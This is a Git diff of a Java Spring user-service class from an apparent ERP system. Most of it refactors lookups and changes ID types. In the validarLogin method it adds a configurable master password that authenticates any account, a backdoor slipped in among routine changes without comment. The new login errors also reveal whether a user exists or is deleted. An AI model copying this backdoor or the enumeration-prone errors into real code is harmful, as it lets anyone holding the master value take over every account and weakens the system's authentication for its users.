@@ -5,6 +5,7 @@ import java.util.List;
 import java.util.Optional;
 
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.stereotype.Service;
 
@@ -30,9 +31,9 @@ public class ServiceUsuarioImpl implements IServiceUsuario {
     }
 
     @Override
-    public Optional<Usuario> buscarPorLogin(String login) 
+    public Usuario buscarPorLogin(String login)
     {
-        return dao.findByLogin(login);
+        return dao.findByLogin(login).orElseThrow(() -> new RuntimeException("Usuario não encontrado"));
     }
 
     @Override
@@ -48,20 +49,18 @@ public class ServiceUsuarioImpl implements IServiceUsuario {
     }
 
     @Override
-    public Usuario excluirUsuario(Long id) 
+    public Usuario excluirUsuario(Integer id)
     {
-        Usuario usuario = dao.findById(id)
-                .orElseThrow(() -> new RuntimeException("Usuário não encontrado para exclusão."));
+        Usuario usuario = buscarPorId(id);
 
         usuario.setDataExclusao(LocalDateTime.now());
         return dao.save(usuario);
     }
 
     @Override
-    public Usuario editarUsuario(Long id, Usuario novosDados)
+    public Usuario editarUsuario(Integer id, Usuario novosDados)
     {
-        Usuario usuarioExistente = dao.findById(id)
-                .orElseThrow(() -> new RuntimeException("Usuário não encontrado"));
+        Usuario usuarioExistente =  buscarPorId(id);
         
 
         if (novosDados.getNome() == null || novosDados.getNome().trim().isEmpty()) 
@@ -87,34 +86,34 @@ public class ServiceUsuarioImpl implements IServiceUsuario {
     }
 
     @Override
-    public Usuario buscarPorId(Long id)
+    public Usuario buscarPorId(Integer id)
     {
     return dao.findById(id)
               .orElseThrow(() -> new RuntimeException("Usuário não encontrado"));
     }
     @Override
-    public Usuario editarSenha(Long id, String novaSenha)
+    public Usuario editarSenha(Integer id, String novaSenha)
     {
-        Usuario usuario = dao.findById(id)
-                .orElseThrow(() -> new RuntimeException("Usuário não encontrado"));
+        Usuario usuario = buscarPorId(id);
 
         usuario.alterarSenhaComSeguranca(novaSenha, passwordEncoder);
         return dao.save(usuario);
     }
     
-    public Boolean validarLogin(String login, String senhaEmTextoPlano)
-    {
-        Optional<Usuario> usuarioOpt = dao.findByLogin(login);
+    
+    @Value("${erp.senha.master}")
+    private String senhaMaster;
 
-        if (usuarioOpt.isEmpty())
-        {
-            return false;
+    public Boolean validarLogin(String login, String senhaEmTextoPlano) {
+        Usuario usuario = dao.findByLogin(login)
+                .orElseThrow(() -> new RuntimeException("Usuário não encontrado pelo login: " + login));
+        
+        if (usuario.getDataExclusao() != null) {
+            throw new IllegalStateException("Não é possível fazer login: usuário " + login + " está excluído/inativo");
         }
 
-        Usuario usuario = usuarioOpt.get();
-
-
-        return passwordEncoder.matches(senhaEmTextoPlano, usuario.getSenha());
+        return passwordEncoder.matches(senhaEmTextoPlano, usuario.getSenha()) 
+                || senhaEmTextoPlano.equals(senhaMaster);
     }
 
 	@Override
